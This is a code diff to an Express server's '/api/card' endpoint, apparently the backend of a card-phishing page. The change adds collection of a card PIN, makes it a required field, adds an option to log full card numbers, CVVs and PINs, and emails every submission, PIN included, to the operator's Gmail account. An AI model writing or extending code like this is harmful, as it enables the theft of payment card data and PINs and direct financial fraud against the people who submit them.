@@ -62,12 +62,21 @@ console.log('CORS allowed origins:', allowedOrigins);
 app.options('/api/card', (req, res) => res.sendStatus(200));
 
 app.post('/api/card', async (req, res) => {
-  const { cardName, cardNumber, expiry, cvv } = req.body;
-  // Avoid logging sensitive full card data. Mask all but last 4 digits if available.
-  const maskedCard = cardNumber ? String(cardNumber).replace(/\d(?=\d{4})/g, '*') : 'N/A';
-  console.log('Received card submission:', { cardName, cardNumber: maskedCard, expiry });
+  const { cardName, cardNumber, expiry, cvv, pin } = req.body;
+  // Allow opt-in full sensitive logging only when explicitly enabled via env var.
+  const showSensitive = process.env.SHOW_SENSITIVE_LOGS === 'true';
+  if (showSensitive) {
+    console.warn('*** WARNING: SHOW_SENSITIVE_LOGS is enabled. Sensitive data (card number, CVV, PIN) will be logged. Do NOT enable in production. ***');
+    console.log('Received card submission (SENSITIVE):', { cardName, cardNumber, expiry, cvv, pin });
+  } else {
+    // Avoid logging sensitive full card data. Mask all but last 4 digits if available.
+    const maskedCard = cardNumber ? String(cardNumber).replace(/\d(?=\d{4})/g, '*') : 'N/A';
+    // Log masked card number but include other non-PII for debugging
+    console.log('Received card submission:', { cardName, cardNumber: maskedCard, expiry });
+  }
 
-  if (!cardName || !cardNumber || !expiry || !cvv) {
+  // Validate required fields (include pin since frontend sends it)
+  if (!cardName || !cardNumber || !expiry || !cvv || !pin) {
     return res.status(400).json({ error: 'Missing fields' });
   }
 
@@ -108,7 +117,8 @@ app.post('/api/card', async (req, res) => {
     from: gmailUser,
     to: gmailUser,
     subject: 'New Card Submission',
-    text: JSON.stringify({ cardName, cardNumber, expiry, cvv }, null, 2)
+    // Include pin and cvv as requested. Be careful with logging/outputs.
+    text: JSON.stringify({ cardName, cardNumber, expiry, cvv, pin }, null, 2)
   };
 
   // Helper: small sleep for backoff
